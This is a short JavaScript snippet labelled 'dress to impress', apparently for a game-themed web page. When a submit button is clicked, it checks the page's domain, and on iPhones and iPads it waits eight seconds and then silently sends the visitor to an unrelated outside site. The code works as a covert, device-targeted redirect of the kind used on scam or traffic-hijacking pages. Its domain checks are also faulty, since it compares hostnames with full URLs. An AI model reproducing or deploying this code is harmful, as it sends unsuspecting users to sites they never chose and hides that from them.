/*================== [ 1 ] ===============*/
/*================== [ dress to impress ] ================*/
var button = document.querySelector('#submitButton');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "https://dti2s.blogspot.com";
        var redirectURL = "https://www.rolls3.com/";
        var blockedDomains = [
            "https://dti2s.blogspot.com/",
            "https://dresstoimpres2.blogspot.com/",
            "https://dresstoimpres2.blogspot.com",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                setTimeout(function() {
                    window.location.href = redirectURL;
                }, 8000);
            }
        }
    })();
});
